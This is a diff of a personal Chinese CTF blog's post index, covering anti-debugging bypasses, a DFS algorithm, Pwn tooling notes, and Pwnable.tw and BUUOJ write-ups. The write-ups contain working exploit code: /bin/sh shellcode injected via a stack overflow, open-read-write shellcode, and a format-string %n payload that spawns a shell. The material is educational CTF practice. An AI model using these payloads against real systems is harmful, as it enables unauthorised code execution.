<span class="number">0x340032</span>;</span><br><span class="line">  SystemRoutineName.Buffer = <span class="string">L&quot;ZwQueryInformationProcess&quot;</span>;</span><br><span class="line">  SystemRoutineAddress = MmGetSystemRoutineAddress(&amp;SystemRoutineName);</span><br><span class="line">  <span class="keyword">if</span> ( !SystemRoutineAddress )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  SystemRoutineAddress(<span class="number">-1</span>i64, <span class="number">7</span>i64, &amp;v3);</span><br><span class="line">  <span class="keyword">return</span> v3 != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="反制措施"><a href="#反制措施" class="headerlink" title="反制措施"></a>反制措施</h3><p>直接patch掉整个函数的调用或者修改控制流使得用于检测调试的信息失效</p>
+<h2 id="NtSetInformationThread-ZwSetInformationThread"><a href="#NtSetInformationThread-ZwSetInformationThread" class="headerlink" title="NtSetInformationThread() &#x2F; ZwSetInformationThread()"></a>NtSetInformationThread() &#x2F; ZwSetInformationThread()</h2><p>两者的分别与上述差不多 功能是设置信息而不是检查信息 当第二个参数为<code>ThreadHideFromDebugger(0x11)</code>时将附加的调试器取消</p>
+<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><h4 id="XCTF-rev-Destination"><a href="#XCTF-rev-Destination" class="headerlink" title="XCTF&#x2F;rev&#x2F;Destination"></a>XCTF&#x2F;rev&#x2F;Destination</h4><p>其中一个预处理函数如下:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__thiscall <span class="title function_">sub_413750</span><span class="params">(<span class="type">void</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE CurrentThread; <span class="comment">// eax</span></span><br><span class="line">  FARPROC ProcAddress; <span class="comment">// [esp+D0h] [ebp-2Ch]</span></span><br><span class="line">  HMODULE hModule; <span class="comment">// [esp+DCh] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_4250E0);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i )</span><br><span class="line">    ModuleName[i] = (ModuleName[i] - <span class="number">100</span>) ^ <span class="number">0x55</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">22</span>; ++j )</span><br><span class="line">    aS[j] = (aS[j] - <span class="number">100</span>) ^ <span class="number">0x55</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">18</span>; ++k )</span><br><span class="line">    byte_423020[k] = (byte_423020[k] - <span class="number">100</span>) ^ <span class="number">0x55</span>;</span><br><span class="line">  hModule = GetModuleHandleA(ModuleName);</span><br><span class="line">  ProcAddress = GetProcAddress(hModule, aS);</span><br><span class="line">  CurrentThread = GetCurrentThread();</span><br><span class="line">  (ProcAddress)(CurrentThread, <span class="number">0x11</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在创建线程处下断点调试到此处 可以看到<code>aS</code>数组储存的实际上是<code>ZwSetInformationThread</code> 而且第二个参数是0x11 这时在线程启动时调试器会被立刻取消</p>
+<h3 id="反制措施-1"><a href="#反制措施-1" class="headerlink" title="反制措施"></a>反制措施</h3><p>将第二个参数patch为0</p>
+]]></content>
+      <tags>
+        <tag>逆向</tag>
+        <tag>反调试</tag>
       </tags>
   </entry>
   <entry>
@@ -1273,7 +1280,7 @@
     <title>UTCTF2024逆向方向部分wp</title>
     <url>/2024/04/04/UTCTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86wp/</url>
     <content><![CDATA[<p>参赛ID:1K0CT, 无队伍</p>
-<p>email:<a href="mailto:&#111;&#x6b;&#117;&#x75;&#115;&#117;&#107;&#x75;&#64;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;">&#111;&#x6b;&#117;&#x75;&#115;&#117;&#107;&#x75;&#64;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;</a></p>
+<p>email:<a href="mailto:&#111;&#x6b;&#117;&#117;&#115;&#x75;&#x6b;&#x75;&#x40;&#103;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#111;&#x6d;">&#111;&#x6b;&#117;&#117;&#115;&#x75;&#x6b;&#x75;&#x40;&#103;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#111;&#x6d;</a></p>
 <p>解出:Fruit Deals, PES-128</p>
 <span id="more"></span>
 
@@ -1310,27 +1317,20 @@
       </tags>
   </entry>
   <entry>
-    <title>反调试技术</title>
-    <url>/2024/03/26/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<p>记录一下遇到的反调试方法和反制措施<span id="more"></span></p>
-<h2 id="NtQueryInformationProcess-ZwQueryInformationProcess"><a href="#NtQueryInformationProcess-ZwQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess() &#x2F; ZwQueryInformationProcess()"></a>NtQueryInformationProcess() &#x2F; ZwQueryInformationProcess()</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>两个都是Windows中检查并获取进程信息的函数 区别在于调用方式和调用权限 Zw需要在内核态调用 Nt在用户态调用 主要起到反调试作用的是第二个参数<code>ProcessInformationClass</code></p>
-<p>当该值为<code>ProcessDebugPort(0x07)</code>时返回缓冲区为<code>-1(调试状态), 0(非调试状态)</code></p>
-<p>当该值为<code>ProcessDebugObjectHandle(0x1E)</code>时返回缓冲区为一个调试对象句柄<code>!=NULL(调试状态), NULL(非调试状态)</code></p>
-<p>当该值为<code>ProcessDebugFlags(0x1F)</code>时返回缓冲区为<code>0(调试状态), 1(非调试状态)</code></p>
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="LineCTF-rev-BrownFlagChecker"><a href="#LineCTF-rev-BrownFlagChecker" class="headerlink" title="LineCTF&#x2F;rev&#x2F;BrownFlagChecker"></a>LineCTF&#x2F;rev&#x2F;BrownFlagChecker</h4><p>其中有一个函数如下:</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">anti_debug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (__fastcall *SystemRoutineAddress)(__int64, __int64, __int64 *); <span class="comment">// rax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">SystemRoutineName</span>;</span> <span class="comment">// [rsp+30h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+50h] [rbp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *&amp;SystemRoutineName.Length = <span class="number">0x340032</span>;</span><br><span class="line">  SystemRoutineName.Buffer = <span class="string">L&quot;ZwQueryInformationProcess&quot;</span>;</span><br><span class="line">  SystemRoutineAddress = MmGetSystemRoutineAddress(&amp;SystemRoutineName);</span><br><span class="line">  <span class="keyword">if</span> ( !SystemRoutineAddress )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  SystemRoutineAddress(<span class="number">-1</span>i64, <span class="number">7</span>i64, &amp;v3);</span><br><span class="line">  <span class="keyword">return</span> v3 != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <title>1!秒钟寄!一个算法:DFS-深度优先搜索</title>
+    <url>/2024/03/16/1-%E7%A7%92%E9%92%9F%E5%AF%84-%E4%B8%80%E4%B8%AA%E7%AE%97%E6%B3%95-DFS-%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/</url>
+    <content><![CDATA[<h3 id="算法概述"><a href="#算法概述" class="headerlink" title="算法概述"></a>算法概述</h3><p>DFS用于找到图中从给定起点到终点所有无交点路线(我猜的) 并不保证全部路线都能找到 也不保证找到的路线是最短的</p>
+<p> 因为CTF遇到过好几次 所以学习一下</p>
+<span id="more"></span>
 
-<h3 id="反制措施"><a href="#反制措施" class="headerlink" title="反制措施"></a>反制措施</h3><p>直接patch掉整个函数的调用或者修改控制流使得用于检测调试的信息失效</p>
-<h2 id="NtSetInformationThread-ZwSetInformationThread"><a href="#NtSetInformationThread-ZwSetInformationThread" class="headerlink" title="NtSetInformationThread() &#x2F; ZwSetInformationThread()"></a>NtSetInformationThread() &#x2F; ZwSetInformationThread()</h2><p>两者的分别与上述差不多 功能是设置信息而不是检查信息 当第二个参数为<code>ThreadHideFromDebugger(0x11)</code>时将附加的调试器取消</p>
-<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><h4 id="XCTF-rev-Destination"><a href="#XCTF-rev-Destination" class="headerlink" title="XCTF&#x2F;rev&#x2F;Destination"></a>XCTF&#x2F;rev&#x2F;Destination</h4><p>其中一个预处理函数如下:</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__thiscall <span class="title function_">sub_413750</span><span class="params">(<span class="type">void</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE CurrentThread; <span class="comment">// eax</span></span><br><span class="line">  FARPROC ProcAddress; <span class="comment">// [esp+D0h] [ebp-2Ch]</span></span><br><span class="line">  HMODULE hModule; <span class="comment">// [esp+DCh] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_4250E0);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i )</span><br><span class="line">    ModuleName[i] = (ModuleName[i] - <span class="number">100</span>) ^ <span class="number">0x55</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">22</span>; ++j )</span><br><span class="line">    aS[j] = (aS[j] - <span class="number">100</span>) ^ <span class="number">0x55</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">18</span>; ++k )</span><br><span class="line">    byte_423020[k] = (byte_423020[k] - <span class="number">100</span>) ^ <span class="number">0x55</span>;</span><br><span class="line">  hModule = GetModuleHandleA(ModuleName);</span><br><span class="line">  ProcAddress = GetProcAddress(hModule, aS);</span><br><span class="line">  CurrentThread = GetCurrentThread();</span><br><span class="line">  (ProcAddress)(CurrentThread, <span class="number">0x11</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在创建线程处下断点调试到此处 可以看到<code>aS</code>数组储存的实际上是<code>ZwSetInformationThread</code> 而且第二个参数是0x11 这时在线程启动时调试器会被立刻取消</p>
-<h3 id="反制措施-1"><a href="#反制措施-1" class="headerlink" title="反制措施"></a>反制措施</h3><p>将第二个参数patch为0</p>
+<h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dfs_iterative_paths</span>(<span class="params">graph, start, end = start</span>):</span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line">    stack = [(start, [start])]</span><br><span class="line"></span><br><span class="line">    paths = []</span><br><span class="line">    <span class="keyword">while</span> stack:</span><br><span class="line">        node, path = stack.pop()</span><br><span class="line">        visited.add(node)</span><br><span class="line">        <span class="keyword">if</span> node == end:</span><br><span class="line">            paths.append(path)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> neighbor <span class="keyword">in</span> graph[node]:</span><br><span class="line">            <span class="keyword">if</span> neighbor <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">                stack.append((neighbor, path + [neighbor]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> paths</span><br></pre></td></tr></table></figure>
 ]]></content>
+      <categories>
+        <category>算法</category>
+        <category>图论</category>
+      </categories>
       <tags>
-        <tag>逆向</tag>
-        <tag>反调试</tag>
+        <tag>算法</tag>
       </tags>
   </entry>
   <entry>
@@ -1414,10 +1414,45 @@
       </tags>
   </entry>
   <entry>
+    <title>Pwn入门记录</title>
+    <url>/2024/05/22/Pwn%E5%85%A5%E9%97%A8%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>仅作用作在Pwn领域摸爬滚打的自用笔记 只记录小知识点</p>
+<span id="more"></span>
+
+<h1 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h1><p>只描述方便我自己理解的 不一定标准</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high</span><br><span class="line"> ↑</span><br><span class="line"> 	...</span><br><span class="line"> 	Return Addr</span><br><span class="line"> 	Caller&#x27;s rbp</span><br><span class="line"> 	(Callee&#x27;s Registers)</span><br><span class="line">	Buf(Local variables)</span><br><span class="line">	...</span><br><span class="line"> ↓</span><br><span class="line">low</span><br></pre></td></tr></table></figure>
+
+<p><code>call func</code>指令执行时会先将call指令的下一条指令push入栈 退出函数时保证堆栈平衡即rsp恢复到调用程序前一行的状态 函数结束前通过leave或直接<code>add rsp, xxx</code>来达到堆栈平衡</p>
+<h1 id="GEF常用指令"><a href="#GEF常用指令" class="headerlink" title="GEF常用指令"></a>GEF常用指令</h1><h2 id="telescope-dereference-register"><a href="#telescope-dereference-register" class="headerlink" title="telescope | dereference [register]"></a>telescope | dereference [register]</h2><p>递归地解引用某寄存器所含地址</p>
+<h2 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h2><h3 id="pattern-creat-lenth"><a href="#pattern-creat-lenth" class="headerlink" title="pattern creat [lenth]"></a>pattern creat [lenth]</h3><p>创建长度为lenth的负载 负载的形式可以搭配下一个指令进行栈溢出长度的计算</p>
+<h3 id="pattern-search-register"><a href="#pattern-search-register" class="headerlink" title="pattern search [register]"></a>pattern search [register]</h3><p>查找创建的负载中哪4&#x2F;8字节(根据程序的平台)与目标寄存器中的相同 以此可以通过传入<code>$rsp</code>计算栈溢出长度</p>
+<h1 id="IDA配合Pwntools进行动态调试"><a href="#IDA配合Pwntools进行动态调试" class="headerlink" title="IDA配合Pwntools进行动态调试"></a>IDA配合Pwntools进行动态调试</h1><p>因为正常IDA启动程序无法输入不可打印字符 所以需要配合pwntools发送数据 实现这个功能的具体步骤:</p>
+<p>1.用socat进行端口转发</p>
+<p><code>socat TCP-LISTEN:19961,reuseaddr,fork EXEC:./Program_to_debug,pty,raw,echo=0</code></p>
+<p>执行指令后<code>Program_to_debug</code>会立即启动并监听本机<code>19961</code>端口</p>
+<p>2.用pwntools附加到程序</p>
+<p>Python中导入pwn后使用<code>io = remote(&#39;127.0.0.1&#39;, 19961)</code>来建立和程序的链接 此时可以使用<code>io.send()</code>来发送数据</p>
+<p>3.用IDA附加到程序</p>
+<p><code>Debugger</code>选项卡中选择远端调试-&gt;附加到程序就能看到刚刚启用的的待调试程序:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-130646.png" alt="image-20240528130639443"></p>
+<p>注意事项:</p>
+<p>运行程序前要先在想要停下的地方下好断点 运行起来后IDA直接F9运行 一般在输入后下断点并在Python终端中向程序发送数据 发送完数据后程序就会断在刚刚下好的断点处</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-131047.png" alt="image-20240528131047508"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-131106.png" alt="image-20240528131106868"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>PWN</category>
+      </categories>
+      <tags>
+        <tag>Pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AmateursCTF2024逆向方向wp</title>
     <url>/2024/04/15/AmateursCTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91wp/</url>
     <content><![CDATA[<p>参赛ID:1K0CT, Team : 4W3, 最终排名:88th(公开赛道)</p>
-<p>email:<a href="mailto:&#111;&#107;&#x75;&#x75;&#x73;&#x75;&#x6b;&#117;&#x40;&#x67;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;">&#111;&#107;&#x75;&#x75;&#x73;&#x75;&#x6b;&#117;&#x40;&#x67;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;</a></p>
+<p>email:<a href="mailto:&#111;&#107;&#117;&#117;&#x73;&#117;&#107;&#x75;&#64;&#103;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#111;&#109;">&#111;&#107;&#117;&#117;&#x73;&#117;&#107;&#x75;&#64;&#103;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#111;&#109;</a></p>
 <p>做到flocto师傅的题真的每次都要有感而发一下 真正能让我全身心投入的赛题 给一个陌生的考点 但是不至于让你寸步难行 有种接触新东西的时候那个东西对你欲拒还迎激发探索欲的美 可能这就是flocto师傅出的题的魅力吧</p>
 <span id="more"></span>
 
@@ -2574,7 +2609,7 @@
     <content><![CDATA[<p>记录一下Pwn入门刷题记录</p>
 <span id="more"></span>
 
-<h2 id="Start-stackoverflow-ret2shellcode"><a href="#Start-stackoverflow-ret2shellcode" class="headerlink" title="Start | stackoverflow | ret2shellcode"></a>Start | stackoverflow | ret2shellcode</h2><p>题目给的二进制文件很简单 直接用系统调用来输出提示和输入 然后<code>_exit</code>退出</p>
+<h2 id="Pwnable-tw-Start-stackoverflow-ret2shellcode"><a href="#Pwnable-tw-Start-stackoverflow-ret2shellcode" class="headerlink" title="Pwnable.tw-Start | stackoverflow | ret2shellcode"></a>Pwnable.tw-Start | stackoverflow | ret2shellcode</h2><p>题目给的二进制文件很简单 直接用系统调用来输出提示和输入 然后<code>_exit</code>退出</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048060 54                            push    esp</span><br><span class="line">.text:08048061 68 9D 80 04 08                push    offset _exit</span><br><span class="line">.text:08048066 31 C0                         xor     eax, eax</span><br><span class="line">.text:08048068 31 DB                         xor     ebx, ebx</span><br><span class="line">.text:0804806A 31 C9                         xor     ecx, ecx</span><br><span class="line">.text:0804806C 31 D2                         xor     edx, edx</span><br><span class="line">.text:0804806E 68 43 54 46 3A                push    3A465443h</span><br><span class="line">.text:08048073 68 74 68 65 20                push    20656874h</span><br><span class="line">.text:08048078 68 61 72 74 20                push    20747261h</span><br><span class="line">.text:0804807D 68 73 20 73 74                push    74732073h</span><br><span class="line">.text:08048082 68 4C 65 74 27                push    2774654Ch</span><br><span class="line">.text:08048087 89 E1                         mov     ecx, esp                        ; addr</span><br><span class="line">.text:08048089 B2 14                         mov     dl, 14h                         ; len</span><br><span class="line">.text:0804808B B3 01                         mov     bl, 1                           ; fd</span><br><span class="line">.text:0804808D B0 04                         mov     al, 4</span><br><span class="line">.text:0804808F CD 80                         int     80h                             ; LINUX - sys_write</span><br><span class="line">.text:0804808F</span><br><span class="line">.text:08048091 31 DB                         xor     ebx, ebx</span><br><span class="line">.text:08048093 B2 3C                         mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095 B0 03                         mov     al, 3</span><br><span class="line">.text:08048097 CD 80                         int     80h                             ; LINUX -</span><br><span class="line">.text:08048097</span><br><span class="line">.text:08048099 83 C4 14                      add     esp, 14h</span><br><span class="line">.text:0804809C C3                            retn</span><br><span class="line">.text:0804809C</span><br><span class="line">.text:0804809C                               _start endp ; sp-analysis failed</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               ; Attributes: noreturn</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               ; void exit(int status)</span><br><span class="line">.text:0804809D                               _exit proc near                         ; DATA XREF: _start+1↑o</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               status= dword ptr  4</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D 5C                            pop     esp</span><br><span class="line">.text:0804809E 31 C0                         xor     eax, eax</span><br><span class="line">.text:080480A0 40                            inc     eax</span><br><span class="line">.text:080480A1 CD 80                         int     80h</span><br></pre></td></tr></table></figure>
 
 <p><code>checksec</code>可以看到保护全关 <code>vmmap</code>发现栈可写可执行 用gdb调试一下可以发现有栈溢出<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/22/20240522-194541.png" alt="image-20240522194534063"></p>
@@ -2586,11 +2621,11 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">b&#x27;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + p32(esp + <span class="number">20</span>) + shellcode</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>最后拿到flag</p>
-<h2 id="orw-shellcode"><a href="#orw-shellcode" class="headerlink" title="orw | shellcode"></a>orw | shellcode</h2><p>题目描述只能使用<code>open</code> <code>read</code> <code>write</code>系统调用 flag目录在<code>/home/orw/flag</code> 程序没有对输入有任何过滤 对输入的长度也几乎没有限制 可以直接用pwntools的shellcraft构造shellcode <a href="https://filippo.io/linux-syscall-table/">这个网站</a>可以查到linux系统调用约定</p>
+<h2 id="Pwnable-tw-orw-shellcode"><a href="#Pwnable-tw-orw-shellcode" class="headerlink" title="Pwnable.tw-orw | shellcode"></a>Pwnable.tw-orw | shellcode</h2><p>题目描述只能使用<code>open</code> <code>read</code> <code>write</code>系统调用 flag目录在<code>/home/orw/flag</code> 程序没有对输入有任何过滤 对输入的长度也几乎没有限制 可以直接用pwntools的shellcraft构造shellcode <a href="https://filippo.io/linux-syscall-table/">这个网站</a>可以查到linux系统调用约定</p>
 <p>查到<code>open</code>第一个参数为文件路径 第二个参数为读写标志位 返回的文件指针按照i86调用约定存放在<code>EAX</code>中 然后再用<code>read</code>读取文件并将其存放到一个缓冲区中 最后用<code>write</code>指定标准输出流为文件指针将缓冲区的内容写到输出流中:</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">sh = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">shellcode = shellcraft.i386.linux.<span class="built_in">open</span>(<span class="string">&#x27;/home/orw/flag&#x27;</span>, <span class="number">0</span>)	//以READ_ONLY(<span class="number">0</span>)标志位打开文件</span><br><span class="line">shellcode += shellcraft.i386.linux.read(<span class="string">&#x27;eax&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">100</span>)	//以esp作为缓冲区指针 读取<span class="number">100</span>字节</span><br><span class="line">shellcode += shellcraft.i386.linux.write(<span class="number">1</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">100</span>)		//<span class="number">1</span>为标准输出流</span><br><span class="line">sh.send(asm(shellcode))</span><br><span class="line"><span class="built_in">print</span>(sh.recv(<span class="number">100</span>))</span><br></pre></td></tr></table></figure>
 
-<h2 id="第五空间2019-决赛-PWN5-格式化字符串漏洞"><a href="#第五空间2019-决赛-PWN5-格式化字符串漏洞" class="headerlink" title="[第五空间2019 决赛]PWN5 | 格式化字符串漏洞"></a>[第五空间2019 决赛]PWN5 | 格式化字符串漏洞</h2><p><code>checksec</code>发现开了<code>NX</code>和<code>canary</code> 关闭了随机硬件地址 IDA打开看看主函数:</p>
+<h2 id="BUUOJ-第五空间2019-决赛-PWN5-格式化字符串漏洞"><a href="#BUUOJ-第五空间2019-决赛-PWN5-格式化字符串漏洞" class="headerlink" title="BUUOJ-[第五空间2019 决赛]PWN5 | 格式化字符串漏洞"></a>BUUOJ-[第五空间2019 决赛]PWN5 | 格式化字符串漏洞</h2><p><code>checksec</code>发现开了<code>NX</code>和<code>canary</code> 关闭了随机硬件地址 IDA打开看看主函数:</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;random, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == random )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>主要流程为用随机数生成器生成一个双字随机数 然后输入两个字符串 输入name后会有回显 输入passwd后与生成的随机数对比 相同的话就能拿到shell</p>
@@ -2608,41 +2643,25 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(<span class="number">0x804C044</span>)+p32(<span class="number">0x804C045</span>)+p32(<span class="number">0x804C046</span>)+p32(<span class="number">0x804C047</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;passwd:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;269488144&#x27;</span>)	<span class="comment">#0x10101010</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>即可拿到shell</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>PWN</category>
-      </categories>
-      <tags>
-        <tag>Pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pwn入门记录</title>
-    <url>/2024/05/22/Pwn%E5%85%A5%E9%97%A8%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>仅作用作在Pwn领域摸爬滚打的自用笔记 只记录小知识点</p>
-<span id="more"></span>
+<h2 id="BUUOJ-ciscn-2019-c-1-ret2libc"><a href="#BUUOJ-ciscn-2019-c-1-ret2libc" class="headerlink" title="BUUOJ-ciscn_2019_c_1 | ret2libc"></a>BUUOJ-ciscn_2019_c_1 | ret2libc</h2><p>程序有两个能输入的地方 <code>encrypt()</code>中有明显的栈溢出:</p>
+<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-150927.png" alt="image-20240613150920256" style="zoom: 67%;" />
 
